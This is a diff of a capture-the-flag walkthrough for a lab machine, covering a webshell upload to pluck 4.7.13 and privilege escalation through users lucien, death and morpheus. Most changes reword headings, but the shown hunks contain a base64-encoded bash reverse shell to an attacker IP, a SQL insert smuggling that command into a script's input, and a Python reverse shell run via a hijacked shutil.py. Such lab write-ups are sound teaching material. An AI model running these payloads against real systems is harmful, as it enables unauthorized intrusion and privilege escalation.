@@ -1,6 +1,8 @@
+I run nmapAutomator.sh to get the initial enumeration going. This shows 2 open ports, 22 and 80.
+
 # Foothold
 
-# 80
+### 80
 
 80 shows apache default page
 apache 2.4.41
@@ -43,8 +45,8 @@ Uploaded Webshell to: http://10.10.223.148:80/app/pluck-4.7.13//files/shell.phar
 
 
 # 22
-
-connecting to ssh show us this custom message:
+Although we have a foothold, don't forget to check the other port aswell.
+Connecting to ssh show us this custom message:
 ```
                                   {} {}
                             !  !  II II  !  !
@@ -80,7 +82,7 @@ W e l c o m e, s t r a n g e r . . .
 ```
 
 
-# User 1
+# Lucien
 
 Using whoami shows that we're currently the www-data user.
 
@@ -117,9 +119,9 @@ unexpected folder in root:
 /kingdom_backup
 
 
-# opt files
+## opt files
 
-## getDreams.py
+### getDreams.py
 
 ```
 getDreams.py
@@ -218,7 +220,7 @@ This gives us the first flag in luciens home folder.
 cat ~/lucien_flag.txt
 ```
 
-## user 2
+# Death
 
 checking our groups with 
 ```
@@ -296,7 +298,7 @@ In the last line we can see that our command executed. Now we have several paths
 L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjEwNC85MDAyIDA+JjE=|base64 -d|bash
 ```
 
-So our entry in the table looks like this:
+So our query looks like this:
 ```
 INSERT INTO dreams VALUES ('attacker', ';echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjEwNC85MDAyIDA+JjE=|base64 -d|bash');
 ```
@@ -313,7 +315,7 @@ sudo -u death /usr/bin/python3 /home/death/getDreams.py
 
 Now we can grab flag #2 and head onto the last user: morpheus
 
-# user 3
+# Morpheus
 
 Checking the home folder of morpheus, we find a restore.py that we can read but not execute:
 
@@ -331,16 +333,16 @@ print("The kingdom backup has been done!")
 
 Because of the name, I think this file get's executed regularly. To check this, we can use pspy. Download it and execute it. Let it run for a couple of minutes.
 
-![[Pasted image 20240213131030.png]]
 
 WE can see that indeed restore.py is getting executed. Checking /etc/passwd shows that UID 1002 is morpheus. This is most likely the path to morpheus.
 
 The script itself doesn't do a whole lot. The only thing I can think of here is library hijacking. So let's looks for the shutil library:
 
-![[Pasted image 20240213131856.png]]
-
-
-![[Pasted image 20240213131613.png]]
+```
+find / -name shutil.py 2>/dev/null
+/usr/lib/python3.8/shutil.py
+dir -lah /usr/lib/python3.8/shutil.py
+```
 
 Neat, the file is writeable for users of the death group, which we belong to (use id -Gn to confirm)
 
@@ -351,4 +353,6 @@ export RHOST="10.11.72.104";export RPORT=9003;python3 -c 'import sys,socket,os,p
 ```
 
 
-This pops the last shell after waiting for a bit. Thanks for reading.
+This pops the last shell after waiting for a bit. Grab the last flag.
+
+Thanks for reading.
